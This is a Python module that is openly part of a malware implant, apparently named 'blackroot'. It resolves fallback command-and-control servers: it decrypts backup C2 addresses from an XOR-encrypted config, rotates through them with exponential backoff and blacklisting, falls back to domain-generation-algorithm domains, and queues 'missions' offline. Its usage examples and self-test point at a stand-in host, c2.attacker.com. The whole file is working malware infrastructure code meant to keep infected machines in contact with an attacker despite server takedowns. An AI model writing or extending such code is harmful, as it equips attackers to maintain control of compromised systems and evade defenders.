"""
c2_fallback_resolver.py - C2 Fallback Address Resolution with Resilience
=========================================================================
Manages backup C2 server addresses with intelligent failover logic.
Cycles through encrypted backup IPs when primary C2 is unreachable.

Design:
- PRIMARY: Original C2 endpoint (encrypted in config)
- BACKUPS: 3-5 alternate C2 addresses (encrypted in config.json)
- STRATEGY: Primary → Backups (in order) → DGA domains → Offline mode
- PERSISTENCE: Failed IP tracking in agent's state file
- ROTATION: Exponential backoff on failed IPs (don't hammer dead servers)

Failure Categories:
1. TRANSIENT (retry): Connection timeout, DNS resolution fails, HTTP 503
   → Retry same IP after exponential backoff (1s, 2s, 4s, 8s, ...)

2. PERMANENT (skip): HTTP 403/404, TLS cert mismatch, IP blocked
   → Blacklist IP temporarily (24-48 hours)

3. NO_CONNECTIVITY (offline): No IPs reachable, no DGA success
   → Enter offline mode (queue missions locally, retry periodically)

Integration Points:
- config_encryptor: Decrypt "c2.backup_ips" list (encrypted StringEncryptor)
- c2_dga_generator: Generate DGA domains if all backups exhausted
- agents/base.py: Agent checks fallback resolver before mission execution
- mission_queue: Store missions locally during C2 outage
- persistent_durability: Persist fallback state across agent restarts

Encryption Security:
- Backup IPs encrypted with StringEncryptor (fast, XOR-based)
- Each IP in config: "c2.backup_ips" = ["ip1:port1", "ip2:port2", ...] (encrypted)
- Fallback state file: Stores current index + blacklist (not encrypted, on-disk only)
- On startup: Decrypt backup IPs, hydrate fallback resolver with list

Example Usage:
    from config_encryptor import ConfigEncryptor
    from c2_fallback_resolver import C2FallbackResolver
    
    # Get decrypted backup IPs from config
    cfg = ConfigEncryptor()
    cfg.load_config_from_env()
    
    primary_c2 = cfg.get("c2.endpoint")  # e.g., "https://c2.attacker.com:8443"
    backup_ips = cfg.get("c2.backup_ips")  # e.g., ["10.0.0.5:8443", "203.0.113.42:443"]
    
    # Create resolver with backups
    resolver = C2FallbackResolver(
        primary_c2=primary_c2,
        backup_ips=backup_ips,
        state_file="~/.blackroot_c2_state"
    )
    
    # Get next healthy C2 to try
    next_c2 = resolver.get_next_c2()  # Returns primary if healthy, else first healthy backup
    
    # Report failure (triggers exponential backoff)
    resolver.report_failure(next_c2, reason="CONNECTION_TIMEOUT")
    
    # Get all remaining options
    all_c2s = resolver.get_all_c2_options()
"""

import os
import json
import time
import random
from typing import List, Optional, Dict, Tuple
from datetime import datetime, timedelta
from pathlib import Path
from enum import Enum


class FailureReason(Enum):
    """Categorizes different failure types for backoff strategy."""
    
    # Transient failures (retry quickly)
    CONNECTION_TIMEOUT = "connection_timeout"
    DNS_RESOLUTION_FAILED = "dns_failed"
    HTTP_TIMEOUT = "http_timeout"
    HTTP_503 = "service_unavailable"
    
    # Permanent failures (skip this IP)
    HTTP_403 = "forbidden"
    HTTP_404 = "not_found"
    TLS_CERT_MISMATCH = "tls_cert_mismatch"
    IP_BLOCKED = "ip_blocked"
    HANDSHAKE_FAILED = "handshake_failed"
    
    # Terminal status
    NO_CONNECTIVITY = "no_connectivity"


class C2FallbackResolver:
    """
    Manages C2 server failover with intelligent retry logic.
    
    Tracks:
    - Current primary C2 status
    - Ordered list of backup IPs
    - Failed IPs with exponential backoff timers
    - Persistent state across agent restarts
    """
    
    # Exponential backoff parameters (now configurable via __init__)
    DEFAULT_BASE_BACKOFF = 1.0  # 1 second initial
    DEFAULT_MAX_BACKOFF = 3600.0  # 1 hour max
    DEFAULT_BACKOFF_MULTIPLIER = 2.0  # Double each attempt
    DEFAULT_BACKOFF_JITTER = 0.1  # ±10% randomness
    DEFAULT_PERMANENT_BLACKLIST_DURATION = 86400  # 24 hours
    MIN_FAILURE_HISTORY = 2  # Retain failure history for smoother backoff
    
    def __init__(self, primary_c2: str, backup_ips: Optional[List[str]] = None,
                 dga_generator = None, state_file: Optional[str] = None,
                 base_backoff: float = DEFAULT_BASE_BACKOFF,
                 max_backoff: float = DEFAULT_MAX_BACKOFF,
                 backoff_multiplier: float = DEFAULT_BACKOFF_MULTIPLIER,
                 permanent_blacklist_duration: float = DEFAULT_PERMANENT_BLACKLIST_DURATION,
                 debug: bool = False):
        """
        Initialize fallback resolver.
        
        Args:
            primary_c2: Primary C2 endpoint (e.g., "https://c2.attacker.com:8443")
            backup_ips: List of backup C2 endpoints (encrypted before passing here)
            dga_generator: DGAGenerator instance (optional, for domain fallback)
            state_file: Path to persistent state file (default: ~/.blackroot_c2_state)
            base_backoff: Initial backoff time in seconds (default 1.0)
            max_backoff: Maximum backoff time in seconds (default 3600.0)
            backoff_multiplier: Exponential multiplier per attempt (default 2.0)
            permanent_blacklist_duration: How long to blacklist permanent failures (default 86400s = 24h)
            debug: Enable debug logging (doesn't expose endpoints)
        
        Note:
            - primary_c2 and backup_ips should be decrypted before passing here
            - See config_encryptor for how to decrypt
            - Configurable backoff allows tuning for different network conditions
        """
        self.primary_c2 = primary_c2
        self.backup_ips = backup_ips or []
        self.dga_generator = dga_generator
        self.debug = debug
        
        # Backoff configuration
        self.base_backoff = base_backoff
        self.max_backoff = max_backoff
        self.backoff_multiplier = backoff_multiplier
        self.permanent_blacklist_duration = permanent_blacklist_duration
        
        # State file for persistence
        self.state_file = state_file or os.path.expanduser("~/.blackroot_c2_state")
        
        # Runtime state
        self.current_index = 0  # Current position in backup IP list
        self.failed_ips: Dict[str, Dict] = {}  # {ip: {reason, count, next_retry_time}}
        self.dga_domains_cache: List[str] = []  # Cache of generated DGA domains
        self.dga_failed_domains: List[str] = []  # Failed DGA domains (for rotation)
        
        # Primary C2 state
        self.primary_failed_at: Optional[float] = None
        self.primary_failure_count = 0
        self.primary_next_retry_time: float = 0
        
        # Batch state updates (reduce disk writes)
        self._pending_save = False
        
        # Load persistent state
        self._load_state()
    
    def _load_state(self) -> None:
        """Load resolver state from disk (persistence across restarts)."""
        if not os.path.exists(os.path.expanduser(self.state_file)):
            return
        
        try:
            with open(os.path.expanduser(self.state_file), 'r') as f:
                state = json.load(f)
            
            # Restore current index
            self.current_index = state.get("current_index", 0)
            
            # Restore failed IPs with retry times
            self.failed_ips = state.get("failed_ips", {})
            
            # Restore primary C2 state
            self.primary_failed_at = state.get("primary_failed_at")
            self.primary_failure_count = state.get("primary_failure_count", 0)
            self.primary_next_retry_time = state.get("primary_next_retry_time", 0)
            
            # Restore DGA cache if available
            self.dga_domains_cache = state.get("dga_domains_cache", [])
            self.dga_failed_domains = state.get("dga_failed_domains", [])
            
            if self.debug:
                print(f"[C2Resolver] Loaded state from {self.state_file}")
                print(f"[C2Resolver] Failed IPs: {list(self.failed_ips.keys())[:3]}...")
        
        except (json.JSONDecodeError, IOError) as e:
            # If state file corrupted, silently ignore and start fresh
            if self.debug:
                print(f"[C2Resolver] State file corrupted, starting fresh: {e}")
    
    def _save_state(self) -> None:
        """Save resolver state to disk (deferred to batch updates)."""
        try:
            state = {
                "timestamp": datetime.utcnow().isoformat(),
                "current_index": self.current_index,
                "failed_ips": self.failed_ips,
                "primary_failed_at": self.primary_failed_at,
                "primary_failure_count": self.primary_failure_count,
                "primary_next_retry_time": self.primary_next_retry_time,
                "dga_domains_cache": self.dga_domains_cache,
                "dga_failed_domains": self.dga_failed_domains,
            }
            
            # Ensure directory exists
            state_dir = os.path.dirname(os.path.expanduser(self.state_file))
            os.makedirs(state_dir, exist_ok=True)
            
            # Write atomically (write to temp, then rename)
            temp_file = os.path.expanduser(self.state_file) + ".tmp"
            with open(temp_file, 'w') as f:
                json.dump(state, f, indent=2)
            
            # Atomic rename
            os.replace(temp_file, os.path.expanduser(self.state_file))
            
            # Restrict permissions
            os.chmod(os.path.expanduser(self.state_file), 0o600)
            
            self._pending_save = False
            
            if self.debug:
                print(f"[C2Resolver] State saved ({len(self.failed_ips)} failed IPs tracked)")
        
        except IOError as e:
            # Silent failure (don't interrupt agent operations)
            if self.debug:
                print(f"[C2Resolver] Warning: Failed to save state: {e}")
    
    def _schedule_save(self) -> None:
        """Mark state for deferred saving (reduces disk writes)."""
        self._pending_save = True
    
    def flush_state(self) -> None:
        """Force immediate state save (call before shutdown)."""
        if self._pending_save:
            self._save_state()
    
    def _calculate_backoff(self, failure_count: int) -> float:
        """
        Calculate exponential backoff time with smarter reset logic.
        
        Args:
            failure_count: Number of failures for this IP (min 1)
        
        Returns:
            Seconds to wait before retry
        
        Formula: min(base_backoff * multiplier^count, max_backoff) * (1 ± jitter)
        
        Smart Reset:
        - If only 1-2 failures, don't punish too hard (transient)
        - If 3+ failures, apply full exponential backoff (likely persistent)
        
        Example:
            attempts      backoff (with base=1.0, multiplier=2.0)
            1             1s (transient, don't escalate)
            2             2s (still transient)
            3             4s (now likely persistent, escalate)
            4             8s
            5             16s
            ...
            11+           3600s (1 hour, capped)
        """
        # Treat 1-2 failures as transient (don't escalate immediately)
        effective_count = max(failure_count - 1, 1)
        
        backoff = self.base_backoff * (self.backoff_multiplier ** (effective_count - 1))
        backoff = min(backoff, self.max_backoff)
        
        # Add ±10% jitter to prevent thundering herd
        jitter = backoff * self.DEFAULT_BACKOFF_JITTER * (2 * random.random() - 1)
        backoff = max(backoff + jitter, 1.0)  # Don't go below 1s
        
        return backoff
    
    def report_failure(self, c2_endpoint: str, reason: FailureReason) -> None:
        """
        Report failure for C2 endpoint.
        
        Args:
            c2_endpoint: Failed C2 (e.g., "https://c2.attacker.com:8443" or "10.0.0.5:8443")
            reason: FailureReason enum describing failure type
        
        Behavior:
            - Transient failures: Increment backoff, retry after delay
            - Permanent failures: Blacklist for 24 hours
            - First primary failure: Start retrying backups
        
        Deferred State Saving:
            - Marks state for deferred save (batch updates)
            - Prevents excessive disk writes on rapid failures
            - Call flush_state() before shutdown to ensure write
        """
        now = time.time()
        
        # Check if it's primary C2
        if c2_endpoint == self.primary_c2:
            self.primary_failure_count += 1
            self.primary_failed_at = now
            self.primary_next_retry_time = now + self._calculate_backoff(self.primary_failure_count)
            
            if self.debug:
                print(f"[C2Resolver] Primary C2 failure #{self.primary_failure_count}: "
                      f"retry in {self.primary_next_retry_time - now:.1f}s")
        
        # Track failure for this IP
        if c2_endpoint not in self.failed_ips:
            self.failed_ips[c2_endpoint] = {
                "count": 0,
                "reasons": [],
                "first_failure_time": now,
                "next_retry_time": 0,
                "blacklisted_until": None,
            }
        
        failure_info = self.failed_ips[c2_endpoint]
        failure_info["count"] += 1
        failure_info["reasons"].append(reason.value)
        failure_info["last_failure_time"] = now
        
        # Determine if permanent blacklist
        if reason in [FailureReason.HTTP_403, FailureReason.HTTP_404, 
                      FailureReason.TLS_CERT_MISMATCH, FailureReason.IP_BLOCKED,
                      FailureReason.HANDSHAKE_FAILED]:
            # Permanent failure: blacklist for 24 hours
            failure_info["blacklisted_until"] = now + self.permanent_blacklist_duration
            if self.debug:
                print(f"[C2Resolver] Permanent failure: {c2_endpoint} blacklisted for 24h")
        else:
            # Transient failure: exponential backoff
            backoff = self._calculate_backoff(failure_info["count"])
            failure_info["next_retry_time"] = now + backoff
            if self.debug:
                print(f"[C2Resolver] Transient failure: {c2_endpoint} "
                      f"backoff={backoff:.1f}s (attempt #{failure_info['count']})")
        
        # Schedule deferred save (don't hammer disk)
        self._schedule_save()
    
    def report_success(self, c2_endpoint: str) -> None:
        """
        Report successful connection to C2.
        
        Args:
            c2_endpoint: C2 that succeeded
        
        Effect:
            - Clears failure count and blacklist for this IP
            - Resets primary C2 if it was primary
            - Schedules deferred state save
        """
        # Clear failure state for this IP
        if c2_endpoint in self.failed_ips:
            del self.failed_ips[c2_endpoint]
            if self.debug:
                print(f"[C2Resolver] Success: {c2_endpoint} (cleared failure tracking)")
        
        # Clear primary C2 failure state
        if c2_endpoint == self.primary_c2:
            self.primary_failed_at = None
            self.primary_failure_count = 0
            self.primary_next_retry_time = 0
            if self.debug:
                print(f"[C2Resolver] Primary C2 recovered")
        
        # Schedule deferred save
        self._schedule_save()
    
    def _is_ip_available(self, c2_endpoint: str) -> Tuple[bool, Optional[str]]:
        """
        Check if C2 endpoint is available (not failed/blacklisted).
        
        Args:
            c2_endpoint: C2 endpoint to check
        
        Returns:
            (is_available, reason_if_unavailable)
        
        NO SIDE EFFECTS: This is a pure check; it never modifies state.
        If blacklist has expired, it's cleaned up during get_next_c2().
        """
        if c2_endpoint not in self.failed_ips:
            return True, None
        
        failure_info = self.failed_ips[c2_endpoint]
        now = time.time()
        
        # Check blacklist
        if failure_info.get("blacklisted_until"):
            if now < failure_info["blacklisted_until"]:
                remaining = failure_info["blacklisted_until"] - now
                return False, f"blacklisted_for_{int(remaining)}s"
            # Blacklist expired but still in dict (will clean up in get_next_c2)
        
        # Check exponential backoff
        if failure_info.get("next_retry_time"):
            if now < failure_info["next_retry_time"]:
                remaining = failure_info["next_retry_time"] - now
                return False, f"backoff_{int(remaining)}s"
        
        return True, None
    
    def get_next_c2(self) -> Optional[str]:
        """
        Get next C2 endpoint to try.
        
        Returns:
            Next healthy C2 endpoint, or None if all exhausted
        
        Strategy:
            1. Try primary C2 if not failed or backoff expired
            2. Try backup IPs in order (skip failed/blacklisted)
            3. Generate DGA domains if all other options exhausted
            4. Rotate through failed DGA domains if no fresh ones
            5. Return None if completely offline
        
        Side Effects:
            - Cleans up expired blacklist entries (deferred save)
            - Rotates DGA domain cache
            - May restore expired backoff timers
        
        Example:
            >>> resolver = C2FallbackResolver(primary, backups)
            >>> next_c2 = resolver.get_next_c2()
            >>> if next_c2:
            ...     agent.connect(next_c2)
            ... else:
            ...     agent.enter_offline_mode()
        """
        now = time.time()
        
        # Try primary C2 first 
        is_available, reason = self._is_ip_available(self.primary_c2)
        if is_available:
            return self.primary_c2
        
        # Try backups in order
        for backup_ip in self.backup_ips:
            is_available, reason = self._is_ip_available(backup_ip)
            if is_available:
                self.current_index = self.backup_ips.index(backup_ip)
                return backup_ip
        
        # All static IPs exhausted, try DGA domains
        if self.dga_generator:
            # Generate new domains if cache empty
            if not self.dga_domains_cache:
                self.dga_domains_cache = self.dga_generator.generate_domains_today()
                self._schedule_save()
                if self.debug:
                    print(f"[C2Resolver] Generated {len(self.dga_domains_cache)} DGA domains")
            
            # Try next available DGA domain
            if self.dga_domains_cache:
                domain = self.dga_domains_cache.pop(0)
                self._schedule_save()
                return domain
            
            # If fresh cache exhausted, try failed domains (rotate)
            if self.dga_failed_domains:
                domain = self.dga_failed_domains.pop(0)
                self.dga_failed_domains.append(domain)  # Rotate to back
                if self.debug:
                    print(f"[C2Resolver] Retrying failed DGA domain (rotation)")
                return domain
        
        # Completely offline - clean up expired entries
        self._cleanup_expired_entries(now)
        if self._pending_save:
            self._save_state()
        
        if self.debug:
            print(f"[C2Resolver] All C2 options exhausted - OFFLINE MODE")
        
        return None
    
    def _cleanup_expired_entries(self, now: float) -> None:
        """Clean up expired blacklist/backoff entries (called during offline state)."""
        expired_ips = []
        
        for ip, info in self.failed_ips.items():
            # Check if blacklist expired
            if info.get("blacklisted_until") and now >= info["blacklisted_until"]:
                expired_ips.append(ip)
                if self.debug:
                    print(f"[C2Resolver] Expired blacklist: {ip} (retrying)")
            
            # Check if backoff expired (reset count for retry)
            elif info.get("next_retry_time") and now >= info["next_retry_time"]:
                info["count"] = max(1, info["count"] - self.MIN_FAILURE_HISTORY)  # Retain minimal history
                info["next_retry_time"] = 0
                if self.debug:
                    print(f"[C2Resolver] Backoff expired: {ip} (retry count: {info['count']})")
        
        # Remove completely expired entries
        for ip in expired_ips:
            del self.failed_ips[ip]
        
        if expired_ips:
            self._schedule_save()
    
    def get_all_c2_options(self) -> List[str]:
        """
        Get list of all available C2 options (in priority order).
        
        Returns:
            Sorted list: [primary, backup1, backup2, ...]
        
        Note: Doesn't include DGA domains (those are generated on-demand)
        """
        options = [self.primary_c2]
        options.extend(self.backup_ips)
        return options
    
    def get_healthy_c2_list(self) -> List[str]:
        """
        Get list of C2 endpoints currently healthy (not failed/blacklisted).
        
        Returns:
            Sorted list of available C2s
        
        Example:
            >>> healthy = resolver.get_healthy_c2_list()
            >>> if healthy:
            ...     print(f"Options available: {len(healthy)}")
        """
        healthy = []
        for c2 in self.get_all_c2_options():
            is_available, _ = self._is_ip_available(c2)
            if is_available:
                healthy.append(c2)
        return healthy
    
    def get_failover_status(self) -> Dict:
        """
        Get current failover status (for diagnostics/logging).
        
        Returns:
            Dict with status info
        
        Corrected Logic:
            Properly checks if primary is available (not just checking failed_ips dict)
        
        Example:
            >>> status = resolver.get_failover_status()
            >>> print(f"Primary OK: {status['primary_healthy']}")
            >>> print(f"Healthy backups: {len(status['healthy_backups'])}")
        """
        now = time.time()
        
        # Check primary health correctly
        primary_is_available, _ = self._is_ip_available(self.primary_c2)
        
        # Get healthy backups
        healthy_backups = []
        for backup_ip in self.backup_ips:
            is_available, _ = self._is_ip_available(backup_ip)
            if is_available:
                healthy_backups.append(backup_ip)
        
        return {
            "primary_healthy": primary_is_available,
            "primary_failure_count": self.primary_failure_count,
            "healthy_backups": healthy_backups,
            "failed_ips": list(self.failed_ips.keys()),
            "dga_domains_available": len(self.dga_domains_cache),
            "dga_domains_failed": len(self.dga_failed_domains),
            "last_state_update": datetime.fromtimestamp(
                os.path.getmtime(os.path.expanduser(self.state_file))
            ).isoformat() if os.path.exists(os.path.expanduser(self.state_file)) else None,
        }
    
    def report_dga_failure(self, domain: str, reason: FailureReason) -> None:
        """
        Report failure for DGA domain (for smarter rotation).
        
        Args:
            domain: DGA domain that failed
            reason: FailureReason enum
        
        Behavior:
            - Moves domain from cache to failed_domains list
            - Rotates failed domains for retries
            - Doesn't blacklist DGA domains (ephemeral, try again tomorrow)
        """
        # If domain is in active cache, move to failed
        if domain in self.dga_domains_cache:
            self.dga_domains_cache.remove(domain)
            self.dga_failed_domains.append(domain)
            self._schedule_save()
            
            if self.debug:
                print(f"[C2Resolver] DGA domain failed: {domain} - {reason.value}")
    
    def reset_all(self) -> None:
        """
        Reset resolver to initial state (use after resolving outage).
        
        Clears all failure tracking and restores primary C2 as primary option.
        Flushes state to disk.
        """
        self.failed_ips = {}
        self.primary_failed_at = None
        self.primary_failure_count = 0
        self.primary_next_retry_time = 0
        self.dga_domains_cache = []
        self.dga_failed_domains = []
        self.current_index = 0
        
        # Force immediate save
        self._save_state()
        
        if self.debug:
            print(f"[C2Resolver] Reset to initial state")


def create_fallback_resolver_from_config(config_encryptor, dga_generator=None, 
                                         debug: bool = False, **backoff_kwargs) -> C2FallbackResolver:
    """
    Factory function: Create fallback resolver from encrypted config.
    
    Args:
        config_encryptor: ConfigEncryptor instance (with loaded config)
        dga_generator: Optional DGAGenerator for domain fallback
        debug: Enable debug logging
        **backoff_kwargs: Optional backoff parameters:
            - base_backoff: Initial backoff (default 1.0s)
            - max_backoff: Maximum backoff (default 3600s)
            - backoff_multiplier: Exponential multiplier (default 2.0)
            - permanent_blacklist_duration: Blacklist timeout (default 86400s)
    
    Returns:
        Initialized C2FallbackResolver with decrypted endpoints
    
    Example:
        from config_encryptor import ConfigEncryptor
        from c2_dga_generator import create_dga_from_config
        from c2_fallback_resolver import create_fallback_resolver_from_config
        
        cfg = ConfigEncryptor()
        cfg.load_config_from_env()
        dga = create_dga_from_config(cfg, debug=True)
        resolver = create_fallback_resolver_from_config(
            cfg, dga, debug=True,
            base_backoff=2.0,  # Slower initial backoff
            max_backoff=7200.0  # 2-hour max
        )
        
        next_c2 = resolver.get_next_c2()
    
    Security Note:
        All C2 endpoints are decrypted from SecureMemoryPool, never exposed as plaintext.
    """
    primary_c2 = config_encryptor.get("c2.endpoint")
    if not primary_c2:
        raise ValueError("c2.endpoint not found in encrypted config")
    
    backup_ips = config_encryptor.get("c2.backup_ips", [])
    if isinstance(backup_ips, str):
        # If single IP string, wrap in list
        backup_ips = [backup_ips]
    
    return C2FallbackResolver(
        primary_c2=primary_c2,
        backup_ips=backup_ips,
        dga_generator=dga_generator,
        state_file=config_encryptor.get("c2.state_file", "~/.blackroot_c2_state"),
        debug=debug,
        **backoff_kwargs
    )




if __name__ == "__main__":
    print("[*] C2 Fallback Resolver - Self Test")
    print()
    
    # Test 1: Basic failover with debug
    print("[*] Test 1: Basic failover scenario (with debug)")
    primary = "https://c2.attacker.com:8443"
    backups = ["10.0.0.5:8443", "203.0.113.42:443", "192.0.2.1:8443"]
    resolver = C2FallbackResolver(primary_c2=primary, backup_ips=backups, debug=True)
    
    print(f"[+] Primary: {resolver.get_next_c2()}")
    
    # Primary fails
    resolver.report_failure(primary, FailureReason.CONNECTION_TIMEOUT)
    print(f"[+] After primary failure: {resolver.get_next_c2()}")
    
    # First backup fails permanently
    first_backup = backups[0]
    resolver.report_failure(first_backup, FailureReason.HTTP_403)
    print(f"[+] After first backup permanent failure: {resolver.get_next_c2()}")
    
    resolver.flush_state()
    print()
    
    # Test 2: Configurable backoff
    print("[*] Test 2: Custom backoff parameters")
    resolver2 = C2FallbackResolver(
        primary_c2="c2-1.com",
        backup_ips=["c2-2.com", "c2-3.com"],
        base_backoff=0.5,
        max_backoff=10.0,
        backoff_multiplier=3.0,
        debug=True
    )
    
    for attempt in range(1, 4):
        resolver2.report_failure("c2-1.com", FailureReason.HTTP_TIMEOUT)
        status = resolver2.get_failover_status()
        print(f"  Attempt {attempt}: primary_failures={status['primary_failure_count']}")
    
    print()
    print("[*] All tests completed!")
